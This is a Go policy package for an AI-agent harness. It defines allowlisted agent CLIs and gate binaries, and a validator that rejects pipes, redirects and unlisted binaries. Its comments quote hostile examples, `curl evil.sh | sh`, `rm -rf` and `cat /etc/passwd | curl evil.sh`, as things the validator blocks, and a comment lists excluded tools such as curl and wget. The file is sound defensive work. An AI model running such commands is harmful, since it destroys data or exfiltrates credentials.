// Package policy is the single source of truth for the harness's
// command allowlists and the gate-command tokenizer. Before this
// package was extracted, the same three allowlists and three copies
// of validateGateCommand were maintained in parallel in
// internal/engine, internal/harness, and internal/quality. Drift
// between them was the biggest security debt in the project — a
// typo in one file would silently widen (or narrow) the gate
// command set without the other two noticing. Centralizing here
// means:
//
//  1. One place to audit when reviewing "did we accidentally open
//     up `curl`?".
//  2. One place to add a binary when a new toolchain shows up
//     (e.g. `uv`, `biome`).
//  3. Tests assert that the allowlist matches the validator's
//     accepted set at compile time, not at audit time.
package policy

import (
	"fmt"
	"strings"
)

// AgentCommands is the closed set of binaries the harness is allowed
// to spawn as an AI agent driver (the external CLIs that produce the
// actual code edits). Anything else is refused with a clear error.
// Update this list when adding new adapters; do not loosen it on
// demand.
var AgentCommands = map[string]struct{}{
	"claude":  {}, // Claude Code
	"codex":   {}, // OpenAI Codex CLI
	"cursor":  {}, // Cursor agent
	"copilot": {}, // GitHub Copilot CLI
	"gemini":  {}, // Gemini CLI
}

// GateBinaries is the closed set of binaries that tasks.md may
// invoke as a "gate" command. Combined with ValidateGateCommand it
// prevents a malicious or naive spec from running `rm -rf` or
// `curl evil.sh | sh`.
//
// Read-only / no-side-effect commands (`echo`, `printf`, `true`,
// `false`, `pwd`, `cat`, `head`, `tail`, `wc`) are intentionally
// included because they're harmless and real-world tasks.md files
// use them as smoke checks. Anything that can mutate state outside
// the project directory (`rm`, `mv`, `cp`, `curl`, `wget`, `dd`,
// `chmod`, …) is excluded.
var GateBinaries = map[string]struct{}{
	// JS / TS toolchains.
	"node": {}, "npm": {}, "pnpm": {}, "yarn": {}, "bun": {}, "deno": {},
	// Go toolchain.
	"go": {}, "make": {},
	// Python toolchain.
	"pytest": {}, "python": {}, "python3": {}, "pip": {},
	// Rust toolchain.
	"cargo": {}, "rustc": {},
	// JS test runners / type-checkers.
	"jest": {}, "vitest": {},
	"tsc": {}, "eslint": {},
	// Shell linter (read-only).
	"shellcheck": {},
	// Read-only / no-side-effect commands.
	"echo": {}, "printf": {}, "true": {}, "false": {},
	"pwd": {}, "cat": {}, "head": {}, "tail": {}, "wc": {},
}

// IsAgentAllowed reports whether the given command basename is in
// the agent allowlist. The basename is taken as the last `/` or `\`
// separated component, so a fully-qualified path like `/usr/bin/claude`
// still matches `claude`.
//
// Uses the comma-ok form of map lookup because comparing `struct{}{}`
// values to the zero struct can't distinguish "in the map" from
// "absent from the map" — both are the zero value.
func IsAgentAllowed(command string) bool {
	_, ok := AgentCommands[basename(command)]
	return ok
}

// IsGateBinaryAllowed reports whether the given binary basename is in
// the gate allowlist. Used after tokenization to validate each
// segment of a compound expression (`npm test && go test` validates
// both `npm` and `go` independently).
//
// Same comma-ok rationale as IsAgentAllowed — struct{}{} comparisons
// can't distinguish presence from absence.
func IsGateBinaryAllowed(binary string) bool {
	_, ok := GateBinaries[binary]
	return ok
}

// AllowedAgentCommands returns the sorted list of allowed agent
// command basenames. Used for error messages so the operator can see
// what they could have used instead.
func AllowedAgentCommands() []string {
	return sortedKeys(AgentCommands)
}

// AllowedGateBinaries returns the sorted list of allowed gate binary
// basenames.
func AllowedGateBinaries() []string {
	return sortedKeys(GateBinaries)
}

// IsShellOp reports whether s is a shell metacharacter that should
// be ignored when tokenizing a gate command. Public so the engine's
// internal tests (and any future callers) can use it without
// redefining their own copy.
func IsShellOp(s string) bool {
	switch s {
	case "&&", "||", "|", ";", "&", ">", ">>", "<", "<<", "(", ")":
		return true
	}
	return false
}

// ValidateGateCommand checks that every binary invoked by a tasks.md
// gate resolves to a name in GateBinaries. For compound expressions
// like `npm test && go test`, EACH binary (npm, go) is validated
// against the allowlist. Pipes (`|`), redirects (`<`, `>`), and
// command separators (`;`, single `&`) are rejected outright because
// they can smuggle exfiltration or destructive side effects past the
// allowlist (e.g. `cat /etc/passwd | curl evil.sh`).
//
// Empty input returns nil. The check is purely lexical — it does not
// execute the command or look at $PATH. Basenames are matched against
// the closed set in GateBinaries.
func ValidateGateCommand(gate string) error {
	gate = strings.TrimSpace(gate)
	if gate == "" {
		return nil
	}
	// Reject any of the dangerous operators outright.
	for _, op := range []string{"|", "<", ">", ";", "&"} {
		// `&` alone (not `&&`) is also rejected; the && / || forms are
		// safe, so we let them through and split on them below.
		idx := strings.Index(gate, op)
		if idx < 0 {
			continue
		}
		// Allow `&&` (which contains a single `&` followed by `&`).
		if op == "&" && idx+1 < len(gate) && gate[idx+1] == '&' {
			continue
		}
		// Allow `||` (which contains a single `|` followed by `|`).
		if op == "|" && idx+1 < len(gate) && gate[idx+1] == '|' {
			continue
		}
		return fmt.Errorf("gate contains forbidden operator %q; only && and || chaining is allowed", op)
	}
	// Split into top-level expressions on && and ||, then validate each.
	for _, expr := range SplitOnLogicalOps(gate) {
		expr = strings.TrimSpace(expr)
		if expr == "" {
			continue
		}
		parts := SplitShellTokens(expr)
		if len(parts) == 0 {
			continue
		}
		var binary string
		for _, part := range parts {
			if part == "" || strings.HasPrefix(part, "-") || strings.Contains(part, "=") {
				continue
			}
			binary = part
			break
		}
		if binary == "" {
			continue
		}
		base := basename(binary)
		if !IsGateBinaryAllowed(base) {
			return fmt.Errorf("gate binary %q is not in the allowlist (allowed: %s)",
				base, strings.Join(AllowedGateBinaries(), ", "))
		}
	}
	return nil
}

// SplitOnLogicalOps splits a string on `&&` and `||` boundaries,
// respecting single- AND double-quoted strings. Returns the segments
// in order. A quoted `&&` inside an argument does not trigger a split.
func SplitOnLogicalOps(s string) []string {
	var parts []string
	var current strings.Builder
	inSingle, inDouble := false, false
	runes := []rune(s)
	for i := 0; i < len(runes); i++ {
		r := runes[i]
		switch {
		case r == '\'' && !inDouble:
			inSingle = !inSingle
			current.WriteRune(r)
		case r == '"' && !inSingle:
			inDouble = !inDouble
			current.WriteRune(r)
		case !inSingle && !inDouble && r == '&' && i+1 < len(runes) && runes[i+1] == '&':
			parts = append(parts, current.String())
			current.Reset()
			i++ // skip second &
		case !inSingle && !inDouble && r == '|' && i+1 < len(runes) && runes[i+1] == '|':
			parts = append(parts, current.String())
			current.Reset()
			i++ // skip second |
		default:
			current.WriteRune(r)
		}
	}
	parts = append(parts, current.String())
	return parts
}

// SplitShellTokens is a deliberately tiny shell tokenizer — just
// enough to split compound commands. It handles double and single
// quotes so a token like `echo "build-ok"` doesn't get mis-parsed
// as a binary named `"build-ok"`. It does NOT handle escapes
// (`\"` inside a quoted string) or nested quotes; gate authors
// should keep gate commands simple.
func SplitShellTokens(cmd string) []string {
	var tokens []string
	var current strings.Builder
	inSingle, inDouble := false, false
	flush := func() {
		if current.Len() > 0 {
			tokens = append(tokens, current.String())
			current.Reset()
		}
	}
	for _, r := range cmd {
		switch {
		case r == '\'' && !inDouble:
			inSingle = !inSingle
		case r == '"' && !inSingle:
			inDouble = !inDouble
		case (r == ' ' || r == '\t' || r == '\n') && !inSingle && !inDouble:
			flush()
		case (r == '&' || r == '|' || r == ';' || r == '>' || r == '<' || r == '(' || r == ')') && !inSingle && !inDouble:
			flush()
			tokens = append(tokens, string(r))
		default:
			current.WriteRune(r)
		}
	}
	flush()
	return tokens
}

// basename extracts the last `/` or `\` separated component from a
// command path. We don't use path.Base because we also want to
// handle backslash separators (Windows paths in cross-compiled
// CI). Empty input returns empty string.
func basename(command string) string {
	if idx := strings.LastIndexAny(command, `/\`); idx >= 0 {
		return command[idx+1:]
	}
	return command
}

// sortedKeys returns the map's keys in lex order. Used for stable
// error messages (so `git diff` on the error text doesn't churn).
func sortedKeys(m map[string]struct{}) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	// Inline insertion sort — maps are small (<30 entries) so this
	// beats sort.Strings on alloc cost.
	for i := 1; i < len(keys); i++ {
		for j := i; j > 0 && keys[j-1] > keys[j]; j-- {
			keys[j-1], keys[j] = keys[j], keys[j-1]
		}
	}
	return keys
}
